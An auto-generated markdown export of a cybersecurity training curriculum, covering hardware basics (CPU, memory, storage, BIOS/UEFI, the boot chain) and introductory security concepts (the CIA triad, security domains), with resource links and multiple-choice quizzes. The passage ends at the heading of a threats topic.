# Technieum Curriculum — 23 Modules

_Auto-generated from `src/lib/data/curriculum.ts`. Do not edit by hand — run `npm run docs:generate`._

Total modules: 23 · Total topics: 223

---

## M0: Computer Hardware Basics

**Month 1** · Week 1 · 5 topics

Foundational hardware knowledge every security professional needs — how a computer's core components work together, from silicon to boot screen. This underpins later topics like buffer overflows, memory forensics, and boot-level attacks (bootkits, Secure Boot bypass).

**Learning Outcomes:**

- Explain the role of the CPU, RAM, ROM, and storage in a running system
- Distinguish HDD, SSD, and NVMe storage and their security implications
- Describe what BIOS/UEFI do and how Secure Boot protects the boot chain
- Walk through what happens, component by component, from power-on to OS load

**Module Resources:**

- [Professor Messer: Hardware Basics](https://www.professormesser.com) _(video)_
- [NIST SP 800-12](https://csrc.nist.gov) _(link)_
- [NIST SP 800-12](https://csrc.nist.gov/pubs/sp/800/12/r1/final) _(link)_
- [HowStuffWorks Computer](https://computer.howstuffworks.com) _(link)_

**Module Quiz (10 questions):**

1. Which sequence correctly represents the boot chain from power-on to OS load?
   - **POST -> firmware reads partition table -> boot loader -> kernel -> init (systemd)** ✓
   - init -> kernel -> boot loader -> firmware -> POST
   - boot loader -> kernel -> POST -> firmware
   - kernel -> POST -> init -> boot loader
   > Firmware runs POST, reads the partition table, hands off to the boot loader, which loads the kernel, which finally starts the init process.
2. A forensic examiner wants to recover encryption keys from a running suspect machine. What should they capture first?
   - **A RAM dump, before the machine is powered off, since RAM is volatile** ✓
   - The ROM contents, since they never change
   - The optical drive contents
   - The GPU's frame buffer only
   > RAM is volatile and can hold live encryption keys/passwords, so it must be captured before shutdown or that evidence is lost.
3. Which storage/security pairing is correct?
   - **SSD TRIM/wear-levelling complicates forensic recovery of deleted data** ✓
   - HDD data is impossible to recover once deleted
   - ROM is volatile and lost on power-off
   - NVMe always disables encryption
   > SSD/NVMe TRIM and wear-levelling relocate and clear data in ways that make forensic recovery unreliable, unlike HDDs where deleted data is often recoverable.
4. Why does a stack buffer overflow give an attacker code execution?
   - **It overwrites the return address/instruction pointer so the CPU jumps to attacker-controlled code** ✓
   - It directly modifies the GPU shader
   - It rewrites the BIOS ROM permanently
   - It corrupts the MBR partition table
   > Overwriting the saved return address redirects the CPU's instruction pointer to code the attacker controls.
5. Which firmware feature specifically defends the boot chain against unsigned bootkits?
   - **Secure Boot** ✓
   - TRIM
   - EEPROM
   - POST alone
   > Secure Boot verifies bootloader signatures, blocking unsigned bootkits from persisting even through a reimage.
6. What distinguishes UEFI from legacy BIOS?
   - **UEFI uses GPT partitioning, offers a GUI, and supports Secure Boot, whereas BIOS uses MBR and a text-only interface** ✓
   - UEFI is slower and lacks a GUI
   - BIOS supports Secure Boot but UEFI does not
   - BIOS uses GPT and UEFI uses MBR
   > UEFI modernises firmware with GPT partitioning (supporting >2TB disks), a graphical interface, and Secure Boot support.
7. Why is GPU parallelism attractive for both graphics rendering and password cracking?
   - **GPUs can perform many simple calculations, like hash attempts, simultaneously across many cores** ✓
   - GPUs execute one instruction per clock cycle like a CPU
   - GPUs store the OS kernel
   - GPUs replace ROM firmware
   > A GPU's many parallel cores let it try huge numbers of hash computations at once, which is why tools like Hashcat rely on GPUs.
8. What happens immediately after POST completes successfully?
   - **Firmware reads the boot device's partition table (MBR/GPT) and hands off to the boot loader** ✓
   - The kernel starts the init process directly
   - The OS desktop is rendered
   - The CPU begins the fetch-decode-execute cycle for the first time
   > After POST verifies hardware, firmware reads the partition table and passes control to the boot loader, well before the kernel or desktop load.
9. Which statement about RAM vs ROM is correct?
   - **RAM is volatile working memory; ROM/EEPROM is non-volatile and holds firmware like BIOS settings** ✓
   - RAM is non-volatile; ROM is volatile
   - Both RAM and ROM lose contents on power-off
   - ROM holds actively running processes
   > RAM loses its contents without power, while ROM/EEPROM retains firmware such as BIOS/UEFI settings across power cycles.
10. A Windows machine using BitLocker is seized while still running and powered on. Why might capturing RAM first be critical?
   - **The disk's encryption key may only be recoverable from RAM while the system is unlocked and powered on** ✓
   - ROM always contains the BitLocker key in plaintext
   - RAM has no forensic value once a disk image exists
   - BitLocker keys are stored on the motherboard silkscreen
   > Encryption keys held in memory disappear once power is lost, so capturing RAM live is often the only way to recover them before the volume locks.

### Topics

#### 1. What is a CPU (Central Processing Unit)? `[theory]` — Week 1

The CPU is the computer's 'brain' — it repeatedly fetches an instruction from memory, decodes what operation it specifies, and executes it, one cycle at a time. To avoid waiting on comparatively slow RAM for every single instruction, the CPU keeps a small hierarchy of on-chip cache memory (fast SRAM) close to the core: L1 (~64KB per core, split into instruction and data caches, fastest at roughly 100x RAM speed), L2 (256KB to several MB per core, roughly 25x RAM speed, acting as a backup for L1), and L3 (32MB or more, shared across all cores, the slowest of the three but still far faster than RAM). This is why CPU performance depends on more than clock speed and core count alone. It also matters directly for security work: a buffer overflow exploit works by overwriting a return address held in a register — the instruction pointer (EIP on x86, RIP on x64) — hijacking what the CPU fetches and executes next.

**Key Points:**

- Fetch-decode-execute cycle: the CPU repeatedly fetches the next instruction, decodes the operation, then executes it
- Registers hold data the CPU is actively working on, including the instruction pointer (EIP on x86 / RIP on x64)
- L1 cache (~64KB per core, split into instruction and data caches) is the fastest cache level (~100x RAM speed) but smallest
- L2 cache (256KB-several MB per core) is slower than L1 (~25x RAM speed) but larger, and backs it up
- L3 cache (32MB+) is shared across all CPU cores — the largest and slowest cache level, still much faster than RAM
- Cache memory is volatile SRAM: its contents are lost on power-off, unlike disk storage
- Cores and clock speed (GHz) determine how many instructions run per second
- A buffer overflow exploit works by overwriting a return address, hijacking the CPU's instruction pointer register

**Resources:**

- [Professor Messer: Computer Basics](https://www.professormesser.com) _(video)_
- [How a CPU Works - HowStuffWorks](https://computer.howstuffworks.com/microprocessor.htm) _(link)_
- [Crash Course Computer Science (YouTube)](https://www.youtube.com/playlist?list=PL8dPuuaLjXtNlUrzyH5r6jN9ulIgZBpdo) _(video)_

**Quick Quiz:**

1. What is the core cycle a CPU uses to process instructions?
   - **Fetch-decode-execute** ✓
   - Compile-link-load
   - Read-write-verify
   - Boot-init-run
   > The CPU repeatedly fetches an instruction, decodes it, and executes it - this fetch-decode-execute cycle is the fundamental CPU operation.
2. In a classic stack-based buffer overflow, what does the attacker overwrite to hijack execution?
   - **The instruction pointer/return address** ✓
   - An ALU register used only for arithmetic
   - A GPU shader register
   - The CPU's clock speed setting
   > Overwriting the return address changes what the CPU's instruction pointer (EIP/RIP) points to next, redirecting execution to attacker-controlled code.
3. Which two factors most directly determine how many instructions a CPU can execute per second?
   - **Number of cores and clock speed (GHz)** ✓
   - RAM size and ROM size
   - HDD RPM and SSD TRIM support
   - MAC address and ARP cache size
   > More cores allow parallel instruction streams and higher clock speed means more cycles per second, together determining raw execution throughput.

#### 2. RAM vs ROM — Volatile vs Non-Volatile Memory `[theory]` — Week 1

RAM and ROM sit at opposite ends of the volatility spectrum. RAM is volatile: it holds data and instructions the CPU is currently working with, and its contents are wiped on power loss — which is exactly why forensic RAM dumps taken before shutdown can recover encryption keys, passwords, and running-process artefacts. ROM (and EEPROM specifically) is non-volatile and retains firmware such as BIOS/UEFI settings across a reboot. Because physical RAM is limited, operating systems also use swapping: temporarily moving inactive processes out of RAM onto secondary storage (disk/SSD) to free space for active ones, then swapping them back in when needed. This lets a system run more processes than would otherwise fit in RAM — at the cost of speed if it happens too often (thrashing).

**Key Points:**

- RAM (volatile): holds data/programs currently in use by the CPU; wiped on power-off
- ROM (non-volatile): retains firmware (e.g. BIOS/UEFI) even without power; EEPROM is why BIOS settings survive a reboot
- Forensic RAM dumps taken before shutdown can recover encryption keys, passwords, and running-process artefacts
- Swapping: the OS moves inactive processes from RAM to disk (swap-out) and back (swap-in) when RAM fills up, letting more processes run than RAM alone allows
- A page fault occurs when a program accesses data that has been swapped out and isn't currently in physical memory
- Overusing swapping causes thrashing — the system spends more time paging data in and out than actually executing work

**Resources:**

- [NIST SP 800-88 Media Sanitization](https://csrc.nist.gov/publications/detail/sp/800-88/rev-1/final) _(link)_
- [How RAM Works - HowStuffWorks](https://computer.howstuffworks.com/ram.htm) _(link)_
- [Volatility Foundation (memory forensics)](https://www.volatilityfoundation.org) _(tool)_

**Quick Quiz:**

1. Which type of memory loses all its contents when power is removed?
   - **RAM** ✓
   - ROM
   - EEPROM
   - BIOS firmware chip
   > RAM is volatile memory that holds data only while powered, unlike ROM/EEPROM which retain firmware without power.
2. Why do forensic investigators prioritize capturing a live RAM dump?
   - **It can reveal encryption keys, passwords, and running-process artefacts that only exist in memory** ✓
   - RAM permanently stores every file ever opened
   - RAM contents survive being fully powered off for weeks
   - RAM only contains BIOS settings
   > Because RAM is volatile and holds live data, a dump captured before shutdown can recover secrets like encryption keys that never touch disk.
3. Why do BIOS/UEFI settings survive a reboot even with no active power source on the board?
   - **Settings are stored in EEPROM, a non-volatile type of ROM** ✓
   - Settings are cached in the CPU registers
   - Settings are stored in RAM, which never loses power
   - The user re-enters settings every boot
   > EEPROM is non-volatile, so BIOS/UEFI configuration persists across power cycles unlike volatile RAM.

#### 3. Storage Types: HDD, SSD, NVMe `[theory]` — Week 1

Storage technology has evolved from spinning magnetic platters to solid-state chips connected directly to the CPU bus. At the hardware level, HDDs, SSDs, and USB drives are all 'block devices' — controlled by a device controller that transfers data in fixed-size chunks (e.g. 512 bytes or 4KB blocks) rather than one byte at a time, which is what makes them suited to storing and retrieving large volumes of data efficiently (as opposed to 'character devices' like keyboards and mice, which stream data one byte at a time). Each storage generation trades off speed, cost, and forensic recoverability differently.

**Key Points:**

- HDD: spinning magnetic platters, slowest, cheapest per GB, deleted data often recoverable (no true erase)
- SSD: flash memory chips, no moving parts, much faster than HDD, uses TRIM/wear-levelling that complicates forensic recovery
- NVMe: SSD connected directly over PCIe instead of SATA — dramatically higher throughput and lower latency
- HDDs, SSDs, and USB drives are all 'block devices' — their controller transfers data in fixed-size chunks (e.g. 512 bytes or 4KB), unlike character devices (keyboards, mice) that transfer one byte/character at a time
- A device controller handles low-level signal translation, data buffering, and basic error detection/correction between the drive and the OS
- Full-disk encryption (BitLocker/LUKS) matters more on SSD/NVMe since deleted data is harder to reliably wipe

**Resources:**

- [Professor Messer: Storage Devices](https://www.professormesser.com) _(video)_
- [NVMe vs SATA SSD - Kingston](https://www.kingston.com/en/blog/pc-performance/nvme-vs-sata-ssd) _(link)_
- [NIST SP 800-88 Media Sanitization](https://csrc.nist.gov/publications/detail/sp/800-88/rev-1/final) _(link)_

**Quick Quiz:**

1. Which storage technology connects directly over the PCIe bus for the highest throughput and lowest latency?
   - **NVMe** ✓
   - SATA HDD
   - Legacy IDE hard drive
   - Optical (CD/DVD) drive
   > NVMe bypasses the older SATA interface and talks to the CPU directly over PCIe, giving far higher throughput and lower latency than SATA-based storage.
2. Why is deleted data often still recoverable on an HDD?
   - **Deletion typically just removes the file's pointer, leaving the magnetic data intact until overwritten** ✓
   - HDDs encrypt all data by default, which is trivially reversible
   - HDDs use TRIM, which instantly destroys the underlying data
   - HDD platters cannot store data once a file is deleted
   > Deleting a file on an HDD generally removes the filesystem's reference to the data, not the underlying magnetic bits, which is why forensic recovery is often possible.
3. Why does full-disk encryption matter more on modern SSD/NVMe drives than on older HDDs, per this topic?
   - **TRIM and wear-levelling make reliably wiping deleted data harder, so encryption is the more dependable protection** ✓
   - SSDs cannot be encrypted at all
   - HDDs are inherently more secure than SSDs
   - NVMe drives store all data in plaintext ROM
   > Because SSD/NVMe wear-levelling relocates data unpredictably, secure erasure is unreliable, making full-disk encryption the more dependable protection.

#### 4. GPU, Motherboard, BIOS/UEFI Explained `[theory]` — Week 1

BIOS and UEFI are the firmware interfaces that initialise all this hardware and load the OS; UEFI is the modern, more secure replacement for legacy BIOS. Accessing either is done by repeatedly pressing a manufacturer-specific key immediately after power-on — commonly F2 or Delete, F10 on many HP systems, or Esc on some ASUS systems — before the boot loader ever takes over. From that setup screen you can reorder boot devices, enable Secure Boot, or push a firmware update, all before the operating system itself loads. Beyond that initial hardware setup, BIOS/UEFI also expose runtime services that the OS and programs can keep calling after boot completes — it isn't just a one-time hardware check. Once the OS is running, it talks to peripherals attached via the motherboard's buses through device drivers: software intermediaries that manage I/O to a device through I/O ports (dedicated addresses a driver reads/writes, e.g. a Linux outb() call), memory-mapped I/O (device registers mapped directly into the CPU's normal memory address space), and interrupts (a device signalling the CPU when it needs attention, handled by an interrupt handler) rather than polling (the CPU repeatedly checking a device's status itself). Concretely, this means reading from input devices like keyboards and mice and writing to output devices like printers and displays, and a driver can do so as blocking I/O — the program pauses until the operation fully completes — or non-blocking I/O, where the program keeps executing while the operation completes in the background for more efficient resource use. Getting this right matters for three reasons: transferring data between software and hardware, system performance, and error handling, since proper I/O management is what catches and handles errors that occur during communication with hardware.

**Key Points:**

- GPU: specialised parallel processor for graphics/rendering, also used for password cracking (Hashcat) due to its parallelism
- Motherboard: connects CPU, RAM, storage, and peripherals via buses
- BIOS uses MBR partitioning (max ~2TB, 4 primary partitions), legacy hardware support, and a text-only interface
- UEFI uses GPT partitioning (supports >2TB, more partitions), has a graphical mouse-driven interface, and supports Secure Boot
- POST (Power-On Self-Test) checks hardware before the boot loader runs
- Common setup-entry keys: F2/Delete on most systems, F10 on HP, Esc on some ASUS systems — pressed repeatedly right after power-on
- Secure Boot blocks unsigned bootloader code — stops bootkits persisting through a reimage; enabled from the UEFI Security tab
- Boot order (which device is tried first, e.g. USB before HDD) is set from the Boot tab — a common step in labs/CTFs that boot from removable media
- BIOS/UEFI also provide runtime services callable by the OS/programs after boot completes, not just one-time hardware initialisation
- UEFI additionally boots faster than legacy BIOS, on top of its larger-drive support and Secure Boot
- Peripherals attached to the motherboard's buses are managed by device drivers — software that mediates I/O between applications and hardware via open/read/write/close operations
- Drivers talk to devices through I/O ports (dedicated addresses, e.g. Linux's outb()) or memory-mapped I/O (device registers mapped into the CPU's normal address space)
- Interrupts let a device signal the CPU when it needs attention (handled by an interrupt handler); polling instead has the CPU repeatedly check the device's status — interrupts are the more efficient approach for infrequent events
- Buffering: temporary storage used during a data transfer to absorb the speed difference between a device and the CPU
- I/O concretely means reading from input devices like keyboards and mice, and writing to output devices like printers and displays
- I/O operations can be blocking (the program pauses and waits until the operation fully completes) or non-blocking (the program keeps executing while the operation completes in the background) — non-blocking I/O makes more efficient use of resources
- I/O operations matter for three reasons: transferring data between software and hardware, system performance, and error handling — catching and handling errors that occur during communication with hardware

**Resources:**

- [UEFI vs Legacy BIOS - Microsoft Learn](https://learn.microsoft.com/windows-hardware/manufacture/desktop/uefi-and-legacy-bios) _(link)_
- [Secure Boot Overview - Microsoft Learn](https://learn.microsoft.com/windows-hardware/design/device-experiences/oem-secure-boot) _(link)_
- [Hashcat](https://hashcat.net/hashcat/) _(tool)_

**Quick Quiz:**

1. Why are GPUs commonly used for password-cracking tools like Hashcat?
   - **Their massively parallel core architecture lets them attempt many hash calculations simultaneously** ✓
   - GPUs store plaintext passwords by default
   - GPUs replace the CPU's fetch-decode-execute cycle entirely
   - GPUs directly read and modify ROM firmware
   > A GPU's huge number of simple parallel cores is ideal for running the same hashing operation across many candidate passwords at once, far faster than a CPU alone.
2. Which partitioning scheme does UEFI use that supports disks larger than 2TB?
   - **GPT** ✓
   - MBR
   - NTFS
   - FAT32
   > GPT, used by UEFI, removes the roughly 2TB and 4-primary-partition limits of the older MBR scheme used by legacy BIOS.
3. What does Secure Boot specifically protect against?
   - **Unsigned/unauthorised bootloader code persisting through a reimage (e.g. bootkits)** ✓
   - Ransomware encrypting user files after the OS has loaded
   - A hard drive failing due to mechanical wear
   - Someone guessing a weak Windows login password
   > Secure Boot verifies the digital signature of bootloader code before running it, blocking unsigned bootkits from persisting even across a reimage.

#### 5. How hardware components interact at boot time `[theory]` — Week 1

The boot process is a strict hand-off chain: firmware (BIOS/UEFI) to boot loader to kernel to init system — each stage verifying and launching the next. On Linux, GRUB (GNU GRand Unified Bootloader) reads its configuration from /etc/default/grub, and any change to it (or a new kernel install) requires re-running `sudo update-grub` before it takes effect. On Windows, the Windows Boot Manager plays the same role; if that chain breaks, `bootrec` run from a recovery Command Prompt repairs a corrupted MBR (`/fixmbr`) or rebuilds the Boot Configuration Data (`/rebuildbcd`). Once the boot loader hands off, the kernel decompresses itself into RAM, sets up memory management, detects hardware, mounts the root filesystem (sometimes via an initial RAM disk, initrd, carrying just enough drivers to do so), and finally starts the init process (PID 1) — the point where control passes from kernel mode into user mode.

**Key Points:**

- POST → BIOS/UEFI reads MBR/GPT → boot loader (GRUB / Windows Boot Manager) loads
- Boot loader loads and decompresses the kernel image into memory; kernel sets up memory management/paging and detects/loads drivers for hardware
- An initial RAM disk (initrd) can supply just enough drivers to mount the real root filesystem
- Kernel mounts the root filesystem then starts the init process (PID 1) — the transition point from kernel mode to user mode
- Modern Linux uses systemd (targets) instead of legacy SysV init/runlevels; GRUB's config lives in /etc/default/grub and must be refreshed with `update-grub` after changes
- On Windows, a broken boot chain is repaired from a recovery Command Prompt with `bootrec /fixmbr` (repairs the MBR) or `bootrec /rebuildbcd` (rebuilds the Boot Configuration Data)
- `dmesg` shows kernel ring-buffer messages from the hardware-detection stage of boot; `ps aux | grep init` confirms the init/systemd process started successfully

```bash
dmesg | less
systemctl get-default
systemctl list-units --type=service --state=running
bootrec /fixmbr
bootrec /rebuildbcd
sudo apt install grub2
sudo update-grub
sudo nano /etc/default/grub
ps aux | grep init
```

**Resources:**

- [Linux Boot Process - Red Hat](https://www.redhat.com/sysadmin/linux-boot-process) _(link)_
- [systemd documentation](https://www.freedesktop.org/wiki/Software/systemd/) _(link)_
- [Windows Boot and UEFI - Microsoft Learn](https://learn.microsoft.com/windows-hardware/manufacture/desktop/boot-and-uefi) _(link)_

**Quick Quiz:**

1. Which sequence correctly describes the boot hand-off chain?
   - **POST -> firmware reads MBR/GPT -> boot loader -> kernel -> init process** ✓
   - Kernel -> POST -> boot loader -> firmware
   - Init process -> kernel -> POST -> firmware
   - Boot loader -> init process -> POST -> kernel
   > Firmware runs POST, reads the partition table, hands off to the boot loader, which loads the kernel, which finally starts the init process.
2. What is PID 1 responsible for on a modern Linux system?
   - **It is the init process (commonly systemd) that starts after the kernel mounts the root filesystem** ✓
   - It is the first user-mode GUI application shown to the user
   - It is a BIOS-level hardware check routine
   - It is the kernel's virtual memory manager
   > After the kernel mounts the root filesystem it starts the init process as PID 1, which on modern Linux is typically systemd.
3. Which command displays the current systemd default boot target?
   - **systemctl get-default** ✓
   - bootrec /fixmbr
   - arp -a
   - iptables -L
   > systemctl get-default reports the systemd target the system boots into by default, such as multi-user.target or graphical.target.


---

## M1: Introduction to Cybersecurity

**Month 1** · Week 1 · 6 topics

The conceptual foundation of the entire programme: what cybersecurity actually protects, the three pillars every control maps to, the different specialisations in the field, and the vocabulary you'll hear in every meeting from here on.

**Learning Outcomes:**

- Define the CIA Triad and map real controls to each pillar
- Distinguish offensive, defensive, and GRC security domains
- Recognise the major attack/threat categories and how they differ
- Use core vocabulary (CVE, CWE, IOC, APT, zero-day, TTP) correctly
- Understand the ethical and legal boundaries of authorised security testing

**Module Resources:**

- [TryHackMe Pre-Security Path](https://tryhackme.com) _(platform)_
- [cve.mitre.org](https://cve.mitre.org) _(link)_
- [MITRE ATT&CK](https://attack.mitre.org) _(link)_
- [TryHackMe Pre-Security Path](https://tryhackme.com/path/outline/presecurity) _(platform)_

**Module Quiz (10 questions):**

1. Which three pillars does every security control map back to in the CIA Triad?
   - **Confidentiality, Integrity, Availability** ✓
   - Authentication, Authorization, Accounting
   - Prevention, Detection, Response
   - Encryption, Hashing, Backups
   > The CIA Triad - Confidentiality, Integrity, Availability - is the foundational model every security control maps to.
2. A ransomware attack that encrypts a company's files and demands payment most directly threatens which CIA pillar?
   - **Availability, since legitimate users can no longer access their data** ✓
   - Only Confidentiality
   - Only Integrity
   - None of the pillars
   > By denying legitimate access to data until a ransom is paid, ransomware primarily attacks availability.
3. Which domain would a red teamer performing an authorised simulated attack belong to?
   - **Offensive Security** ✓
   - GRC
   - Defensive Security
   - It is not a recognised security domain
   > Offensive Security covers pentesting, red teaming, and bug bounty work - simulating attacks to find vulnerabilities first.
4. Which term describes a sophisticated, long-term, often state-sponsored attack campaign?
   - **APT (Advanced Persistent Threat)** ✓
   - CVE
   - IOC
   - TTP
   > APT specifically refers to a sophisticated, long-term, often state-sponsored campaign, distinct from a single CVE, IOC, or TTP.
5. What is the difference between a CVE and a CWE?
   - **CVE is a specific known vulnerability instance; CWE is the general class/root-cause weakness behind it** ✓
   - CVE is a root-cause weakness class; CWE is a specific instance
   - They are exact synonyms
   - CWE only applies to network vulnerabilities
   > CVE-2021-44228 (Log4Shell) is one specific vulnerability, while a CWE like CWE-79 describes the general weakness class (e.g. behind all XSS).
6. Before testing any system you don't own, what must you always obtain first?
   - **Written authorisation (Rules of Engagement)** ✓
   - A screenshot of the login page
   - A CVE number for the target
   - Access to a lab platform's VPN
   > Written authorisation defining scope and rules of engagement is required before testing any system that isn't yours, regardless of intent.
7. Which attack technique commonly relies on ARP spoofing to intercept traffic between two parties?
   - **MITM (Man-in-the-Middle)** ✓
   - DDoS
   - Ransomware
   - Phishing
   > ARP spoofing lets an attacker position themselves between two hosts on a LAN, which is a classic MITM technique.
8. Encrypting a sensitive file so only authorised staff can read it directly protects which CIA pillar?
   - **Confidentiality** ✓
   - Integrity
   - Availability
   - Non-repudiation
   > Restricting readability to authorised parties is the definition of confidentiality.
9. Which vocabulary term specifically describes evidence of a breach, such as a suspicious IP or file hash?
   - **IOC (Indicator of Compromise)** ✓
   - TTP
   - Zero-Day
   - APT
   > An IOC is concrete evidence of compromise, such as a malicious IP, hash, or registry key, distinct from TTPs which describe attacker behaviour.
10. Why is 'responsible disclosure' considered an ethical requirement rather than optional?
   - **It gives the vendor a chance to fix a vulnerability before any public release, preventing real-world exploitation** ✓
   - It guarantees a bug bounty payout
   - It is legally mandated identically in every country with no exceptions
   - It replaces the need for authorisation entirely
   > Responsible disclosure protects users by letting the vendor patch the flaw before details become public and exploitable.

### Topics

#### 6. What is Cybersecurity and Why It Matters `[theory]` — Week 1

Cybersecurity is the practice of protecting computers, networks, systems, and data from cyber threats, unauthorized access, and attacks, ensuring the confidentiality, integrity, and availability (CIA) of digital assets. The source material illustrates this with a simple vending machine: an 'attack' is any action that lets someone do something the machine's creator never intended — reaching into the product-dispenser gap, feeding in fake coins, pulling a coin back out on a thread, or breaking the glass to grab items outright. Each of these has a matching mitigation (the dispenser path closes once opened, coin validators reject fakes, broken glass triggers physical security), and whoever attempts any of it is the 'adversary'. Cybersecurity work is fundamentally about making sure a system — whether a vending machine or a production application — cannot be compromised in any of these ways, inside a landscape of constantly evolving threats and trends.

**Key Points:**

- Definition: protecting computers, networks, systems, and data from cyber threats, unauthorized access, and attacks while ensuring confidentiality, integrity, and availability (CIA) of digital assets
- Vending machine analogy for 'attack': reaching through the dispenser gap, inserting fake money, pulling a coin back out on a thread, and breaking the glass are all attacks — actions the creator never intended
- Every attack has a mitigation: closing the dispenser path once opened, validating coins/money, and physical security responding to broken glass
- The person carrying out an attack is called an 'adversary' — the term used throughout security work for whoever you're defending against
- Why it matters: prevents data breaches that expose personal or business information, protects financial transactions from fraud and theft, ensures business continuity by preventing disruptive attacks, and helps organizations comply with regulations like GDPR and ISO 27001
- Sits within a broader 'cybersecurity landscape' of current trends, challenges, and constantly evolving threats — the field keeps changing rather than being a fixed checklist
- Common frameworks referenced early on (NIST, ISO/IEC 27001) give organizations a structured way to define what 'secure' means for them

**Resources:**

- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework) _(link)_
- [TryHackMe Pre-Security Path](https://tryhackme.com/path/outline/presecurity) _(platform)_
- [Professor Messer Security+ videos](https://www.professormesser.com) _(video)_

**Quick Quiz:**

1. What does cybersecurity primarily aim to ensure about digital assets?
   - **Confidentiality, integrity, and availability** ✓
   - Only preventing physical theft of hardware
   - Faster internet speeds
   - Cheaper cloud storage costs
   > Cybersecurity protects systems and data by ensuring confidentiality, integrity, and availability against threats and unauthorized access.
2. Which of the following is a direct benefit of cybersecurity mentioned in the topic?
   - **Helping organisations comply with regulations like GDPR and ISO 27001** ✓
   - Eliminating the need for backups
   - Guaranteeing 100% uptime with no controls
   - Replacing the need for authorised testing
   > Cybersecurity practices help organisations meet regulatory obligations such as GDPR and ISO 27001, alongside preventing breaches and fraud.
3. Why does cybersecurity matter for business continuity?
   - **It helps prevent disruptive cyberattacks that could halt operations** ✓
   - It only matters for personal home computers
   - It guarantees a company will never be breached
   - It replaces the need for IT support
   > Preventing disruptive attacks such as ransomware or DDoS keeps critical business operations running, which is a core cybersecurity goal.

#### 7. CIA Triad (Confidentiality, Integrity, Availability) `[theory]` — Week 1

The CIA triad — Confidentiality, Integrity, and Availability — are the three core principles to weigh whenever you secure anything. The source material grounds all three in the same vending machine: Confidentiality means only authorized individuals can access data — protecting the physical key that opens the machine, because if an attacker gets that key, no other countermeasure matters. Integrity means keeping data accurate and trustworthy — if a product's price (MRP) is 20, it must always read 20 unless the real price legitimately changes. Availability means the service must actually be usable — a vending machine nobody can buy from has no value, however secure it is. Every security control studied afterward maps back to protecting one or more of these three properties.

**Key Points:**

- Confidentiality: data/systems accessible only to authorized individuals; vending machine example — protect the key that opens the machine, because whoever holds it bypasses every other countermeasure
- Integrity: maintaining the accuracy and trustworthiness of data; vending machine example — a product's MRP of 20 must always show 20, and should never change unless the real price does
- Availability: data/services must be accessible when needed; vending machine example — there's no use for a vending machine if you can't actually buy anything from it
- The three principles work together: encrypting a file protects confidentiality, hashing verifies integrity, and backups ensure availability — no single control covers all three
- Source summary framing: 'Confidentiality — data accessible only to authorized users; Integrity — maintaining accuracy/trustworthiness; Availability — ensuring timely and reliable access'
- Every later module's controls (firewalls, encryption, backups, patching, access control) exist to protect one or more of these three properties — use this as the lens for evaluating any security measure

**Resources:**

- [NIST SP 800-12 (CIA Triad overview)](https://csrc.nist.gov/pubs/sp/800/12/r1/final) _(link)_
- [Professor Messer: CIA Triad](https://www.professormesser.com) _(video)_
- [OWASP](https://owasp.org) _(link)_

**Quick Quiz:**

1. In the CIA Triad, which pillar does encrypting a file primarily protect?
   - **Confidentiality** ✓
   - Integrity
   - Availability
   - Authentication
   > Encryption restricts readability to authorised parties, which is the definition of confidentiality.
2. Which CIA Triad pillar does a cryptographic hash check primarily verify?
   - **Integrity** ✓
   - Confidentiality
   - Availability
   - Non-repudiation
   > A hash lets you confirm data has not been altered, which is the definition of integrity.
3. A DDoS attack that takes a website offline for legitimate users primarily violates which CIA pillar?
   - **Availability** ✓
   - Confidentiality
   - Integrity
   - Accountability
   > Availability means legitimate users can access data/services when needed; a DDoS attack directly denies that access.

#### 8. Types of Cybersecurity Domains (Offensive, Defensive, GRC) `[theory]` — Week 1

Cybersecurity splits into domains with distinct goals. Offensive Security simulates attacks to identify vulnerabilities before real attackers do — the source material's vending machine analogy is hiring someone to try to break the machine, then building mitigations from whatever they find; it covers penetration testing, vulnerability assessment, and red teaming. Defensive Security protects systems, networks, and data from unauthorized access — picking up where offensive security's findings leave off (patching the vending machine the red team broke) and aiming to prevent breaches rather than just react to them. GRC (Governance, Risk, and Compliance) keeps an organization's policies, risk posture, and regulatory obligations in order. The source material also names four further domains that round out how a security organization actually operates day to day: Cloud Security, Application Security, Network Security, Incident Response, and IAM.

**Key Points:**

- Offensive Security: simulating attacks to find vulnerabilities before real attackers do — vending machine example: hire someone to try to break the machine, then fix whatever they find so it can't be repeated; includes penetration testing, vulnerability assessment, and red teaming
- Defensive Security: protecting systems, networks, and data from unauthorized access; picks up where offensive security's findings leave off (patching the vending machine the red team broke); goal is preventing breaches proactively, not just reacting to them
- GRC (Governance, Risk, Compliance): Governance sets policies/frameworks aligning security goals with business objectives; Risk Management identifies, assesses, and mitigates risks; Compliance ensures the org meets standards like GDPR, ISO 27001, and HIPAA
- Cloud Security: securing cloud platforms (AWS, Azure, Google Cloud) — protecting cloud infrastructure from breaches, enforcing proper access control, and implementing encryption, firewalls, and compliance controls
- Application Security: secure coding practices to prevent SQL injection, XSS, and CSRF; regular testing via SAST and DAST; authentication mechanisms like OAuth and multi-factor authentication (MFA)
- Network Security: firewalls, Intrusion Detection/Prevention Systems (IDS/IPS), network segmentation to minimize attack surface, and secure protocols like VPNs and TLS
- Incident Response: detecting, responding to, and mitigating incidents such as breaches or malware infections — building an incident response plan, doing forensic analysis and log review, and coordinating teams to contain and remediate threats
- IAM (Identity and Access Management): managing digital identities via role-based access control (RBAC), enforcing least-privilege access, and using identity federation services like SAML and OpenID Connect

**Resources:**

- [CompTIA Security+ overview](https://www.comptia.org/certifications/security) _(link)_
- [TryHackMe](https://tryhackme.com) _(platform)_
- [ISC2](https://www.isc2.org) _(link)_

**Quick Quiz:**

1. Which security domain focuses on simulating attacks to find vulnerabilities before real attackers do?
   - **Offensive Security** ✓
   - GRC
   - Defensive Security (SOC)
   - None of these
   > Offensive Security includes pentesting, red teaming, and bug bounty work that simulates real attacks to find weaknesses proactively.
2. Which domain is primarily responsible for policies, risk assessment, and meeting standards like ISO 27001 or HIPAA?
   - **GRC (Governance, Risk, Compliance)** ✓
   - Offensive Security
   - Network Security tooling only
   - Incident Response only
   > GRC covers governance frameworks, risk assessment, and compliance with legal/regulatory standards such as GDPR, ISO 27001, and HIPAA.
3. A SOC analyst patching systems and blocking unauthorised access is working primarily in which domain?
   - **Defensive Security** ✓
   - Offensive Security
   - GRC
   - Bug bounty hunting
   > Defensive Security (blue team/SOC) focuses on protecting systems, patching, and preventing unauthorised access, as opposed to simulating attacks.

#### 9. Common Threats & Attack Types (Malware, Phishing, MITM, DDoS, Ransomware) `[theory]` — Week 1

